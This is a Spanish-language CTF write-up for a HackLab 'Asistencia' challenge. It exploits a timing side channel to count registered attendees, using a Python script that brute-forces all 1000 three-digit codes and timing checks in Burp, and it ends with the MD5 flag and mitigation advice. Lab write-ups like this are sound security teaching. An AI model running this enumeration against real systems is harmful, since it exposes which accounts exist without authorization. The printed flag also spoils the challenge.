# Desafío - Asistencia (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Categoría:** Information Disclosure  
**Autor:** adonaissh

## Enunciado

Averiguar cuántos asistentes hay registrados en el sistema (sin tener la clave de acceso al panel de consulta) y generar el MD5 de esa cantidad como código ganador. Se sabe que los asistentes no superan los 200.

## Análisis

La aplicación (`index.php`, PHP 8.0.30 sobre Apache/Debian) tiene un formulario que pide un **código de 3 dígitos** y una **clave**. Cualquier combinación de prueba devuelve siempre el mismo mensaje genérico: *"No se puede acceder a esta información"*. No hay errores verbosos, ni archivos de backup, ni endpoints alternativos expuestos (se probaron rutas típicas de disclosure: `.git`, `robots.txt`, `phpinfo.php`, backups, etc. — todo 404).

El campo `codigo` acepta exactamente 3 dígitos (`000`–`999`), es decir, 1000 combinaciones posibles. La clave, en cambio, no pareció influir en el comportamiento del servidor.

La vulnerabilidad real es un **timing attack**: el servidor tarda notoriamente más en responder cuando el código enviado corresponde a un asistente real registrado en la base de datos (probablemente porque ejecuta una consulta adicional — por ejemplo, un hash de la clave almacenada o una verificación en una tabla — antes de devolver el mensaje de error), mientras que para códigos inexistentes responde casi instantáneamente.

## Explotación

### 1. Primer intento con Burp Intruder (resultado contaminado)

Se probó un ataque con Burp Intruder marcando el campo `codigo` como payload position y recorriendo el rango 100–999 de forma secuencial. Al analizar los tiempos de respuesta se observó una curva decreciente continua (de ~3900ms al inicio hasta ~220ms al final), que no reflejaba la validez del código sino un efecto de "calentamiento" de la conexión/servidor durante el ataque. Con alta concurrencia de hilos el resultado se distorsionaba aún más (todo por encima de 1 segundo), por saturación del servidor.

### 2. Medición secuencial confiable

Para obtener una medición limpia, se armó un script en Python que prueba los 1000 códigos posibles **uno por uno** (sin concurrencia, reusando la conexión HTTP con `requests.Session()` para reducir overhead de handshake), midiendo el tiempo de respuesta de cada request:

```python
import requests

url = "https://<host-del-challenge>/index.php"

session = requests.Session()
cuentas = 0
codigos_lentos = []

for i in range(0, 1000):
    codigo = str(i).zfill(3)
    res = session.post(url, data={'codigo': codigo, 'clave': 'test123'}, timeout=15)
    tiempo = res.elapsed.total_seconds()
    print(f"{codigo}: {tiempo:.3f}s")
    if tiempo > 1:
        cuentas += 1
        codigos_lentos.append(codigo)

print(f"\nTotal de códigos lentos (asistentes): {cuentas}")
print(f"Códigos: {codigos_lentos}")
```

Los códigos "lentos" (por encima de 1 segundo) se interpretan como aquellos que tienen una cuenta/asistente asociado en la base de datos.

### 3. Validación cruzada con muestreo parcial en Burp

En paralelo, se corrió un muestreo parcial con Burp Intruder sobre sub-rangos del total (por ejemplo, 304 de los 901 códigos analizados), contando cuántos resultaban "lentos" dentro de esa muestra. Usando la proporción observada:

```
proporción = códigos_lentos_en_muestra / tamaño_de_muestra
estimación_total ≈ proporción × rango_total
```

Con muestras de distinto tamaño (304 y 296 códigos) se obtuvieron estimaciones de aproximadamente 160–161 asistentes, lo que acotó la búsqueda a un rango reducido de candidatos.

### 4. Confirmación final por fuerza bruta de hashes

Con el rango acotado (~155–165), se generó el MD5 de cada candidato y se probó contra el sistema de verificación del challenge hasta encontrar el correcto:

```python
import hashlib

for n in range(150, 170):
    print(n, hashlib.md5(str(n).encode()).hexdigest())
```

El valor correcto resultó ser **159 asistentes**:

```python
import hashlib
print(hashlib.md5("159".encode()).hexdigest())
# -> 140f6969d5213fd0ece03148e62e461e
```

## Flag

```
140f6969d5213fd0ece03148e62e461e
```

## Causa raíz

El tiempo de procesamiento del servidor varía de forma observable según si el dato recibido (el código) existe o no en la base de datos — probablemente por una consulta adicional (ej. verificación de clave hasheada, JOIN, o lógica condicional costosa) que solo se ejecuta cuando el código es válido. Esta diferencia de tiempo, aunque la respuesta visible sea idéntica en todos los casos, constituye un **canal lateral (side channel)** que permite inferir información sensible (qué códigos existen, y por extensión, cuántos asistentes hay) sin necesidad de autenticarse.

## Recomendación

- Igualar los tiempos de procesamiento entre las ramas "código válido" y "código inválido" (por ejemplo, ejecutando siempre las mismas operaciones computacionalmente costosas, exista o no el registro, o agregando un retraso artificial constante).
- Evitar hacer lookups condicionales que dependan de si un dato existe antes de aplicar una comparación de clave — comparar siempre contra un valor "dummy" de igual costo computacional cuando el registro no existe.
- Limitar la tasa de intentos (rate limiting) para dificultar ataques de timing que requieren muchas mediciones.
